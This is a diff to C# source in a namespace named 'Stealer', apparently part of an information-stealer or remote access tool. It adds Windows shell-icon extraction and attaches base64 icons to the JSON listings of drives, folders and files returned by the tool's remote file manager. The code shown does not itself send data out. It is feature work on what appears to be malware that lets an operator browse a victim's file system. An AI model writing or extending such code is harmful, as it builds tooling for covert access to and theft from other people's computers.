@@ -374,6 +374,86 @@ namespace Stealer
             });
         }
 
+        // ── Shell icon extraction via WinAPI ──────────────────────────────────
+
+        [System.Runtime.InteropServices.DllImport("shell32.dll", CharSet = System.Runtime.InteropServices.CharSet.Auto)]
+        private static extern IntPtr SHGetFileInfo(string pszPath, uint dwFileAttributes, ref SHFILEINFO psfi, uint cbFileInfo, uint uFlags);
+
+        [System.Runtime.InteropServices.DllImport("user32.dll", SetLastError = true)]
+        private static extern bool DestroyIcon(IntPtr hIcon);
+
+        [System.Runtime.InteropServices.StructLayout(System.Runtime.InteropServices.LayoutKind.Sequential, CharSet = System.Runtime.InteropServices.CharSet.Auto)]
+        private struct SHFILEINFO
+        {
+            public IntPtr hIcon;
+            public int iIcon;
+            public uint dwAttributes;
+            [System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.ByValTStr, SizeConst = 260)]
+            public string szDisplayName;
+            [System.Runtime.InteropServices.MarshalAs(System.Runtime.InteropServices.UnmanagedType.ByValTStr, SizeConst = 80)]
+            public string szTypeName;
+        }
+
+        private const uint SHGFI_ICON             = 0x000000100;
+        private const uint SHGFI_SMALLICON        = 0x000000001;
+        private const uint SHGFI_USEFILEATTRIBUTES = 0x000000010;
+        private const uint FILE_ATTRIBUTE_NORMAL   = 0x00000080;
+        private const uint FILE_ATTRIBUTE_DIRECTORY = 0x00000010;
+
+        // Cache: extension (or ":dir"/":drive") → base64 PNG
+        private static readonly System.Collections.Generic.Dictionary<string, string> _iconCache =
+            new System.Collections.Generic.Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
+        private static readonly object _iconCacheLock = new object();
+
+        private static string GetIconBase64(string fullPath, bool isDir, bool isDrive = false)
+        {
+            string cacheKey = isDrive ? ":drive"
+                            : isDir  ? ":dir"
+                            : (System.IO.Path.GetExtension(fullPath) ?? "").ToLowerInvariant();
+
+            lock (_iconCacheLock)
+            {
+                if (_iconCache.TryGetValue(cacheKey, out string cached)) return cached;
+            }
+
+            try
+            {
+                var shfi = new SHFILEINFO();
+                uint attrs = isDir || isDrive ? FILE_ATTRIBUTE_DIRECTORY : FILE_ATTRIBUTE_NORMAL;
+                uint flags = SHGFI_ICON | SHGFI_SMALLICON | SHGFI_USEFILEATTRIBUTES;
+
+                IntPtr ret = SHGetFileInfo(fullPath, attrs, ref shfi,
+                    (uint)System.Runtime.InteropServices.Marshal.SizeOf(shfi), flags);
+
+                if (ret == IntPtr.Zero || shfi.hIcon == IntPtr.Zero) return null;
+
+                string b64 = null;
+                try
+                {
+                    using (var icon = System.Drawing.Icon.FromHandle(shfi.hIcon))
+                    using (var bmp = icon.ToBitmap())
+                    using (var ms = new System.IO.MemoryStream())
+                    {
+                        bmp.Save(ms, System.Drawing.Imaging.ImageFormat.Png);
+                        b64 = Convert.ToBase64String(ms.ToArray());
+                    }
+                }
+                finally { DestroyIcon(shfi.hIcon); }
+
+                if (b64 != null)
+                {
+                    lock (_iconCacheLock) { _iconCache[cacheKey] = b64; }
+                }
+                return b64;
+            }
+            catch { return null; }
+        }
+
+        private static string IconJson(string b64) =>
+            b64 != null ? ",\"icon\":\"" + b64 + "\"" : "";
+
+        // ── File Manager ──────────────────────────────────────────────────────
+
         private static void FmListDirectory(string path)
         {
             Task.Run(() =>
@@ -392,7 +472,8 @@ namespace Stealer
                                 string n = drive.Name.Replace("\\", "\\\\");
                                 string label = "";
                                 try { label = (drive.VolumeLabel ?? "").Replace("\"", "\\\""); } catch { }
-                                items.Add("{\"name\":\"" + n + "\",\"type\":\"drive\",\"size\":0,\"modified\":\"\",\"label\":\"" + label + "\"}");
+                                string ico = IconJson(GetIconBase64(drive.Name, false, true));
+                                items.Add("{\"name\":\"" + n + "\",\"type\":\"drive\",\"size\":0,\"modified\":\"\",\"label\":\"" + label + "\"" + ico + "}");
                             }
                             catch { }
                         }
@@ -406,7 +487,8 @@ namespace Stealer
                             {
                                 string n = d.Name.Replace("\\", "\\\\").Replace("\"", "\\\"");
                                 string mod = d.LastWriteTime.ToString("yyyy-MM-dd HH:mm");
-                                items.Add("{\"name\":\"" + n + "\",\"type\":\"dir\",\"size\":0,\"modified\":\"" + mod + "\"}");
+                                string ico = IconJson(GetIconBase64(d.FullName, true));
+                                items.Add("{\"name\":\"" + n + "\",\"type\":\"dir\",\"size\":0,\"modified\":\"" + mod + "\"" + ico + "}");
                             }
                             catch { }
                         }
@@ -416,7 +498,8 @@ namespace Stealer
                             {
                                 string n = f.Name.Replace("\\", "\\\\").Replace("\"", "\\\"");
                                 string mod = f.LastWriteTime.ToString("yyyy-MM-dd HH:mm");
-                                items.Add("{\"name\":\"" + n + "\",\"type\":\"file\",\"size\":" + f.Length + ",\"modified\":\"" + mod + "\"}");
+                                string ico = IconJson(GetIconBase64(f.FullName, false));
+                                items.Add("{\"name\":\"" + n + "\",\"type\":\"file\",\"size\":" + f.Length + ",\"modified\":\"" + mod + "\"" + ico + "}");
                             }
                             catch { }
                         }
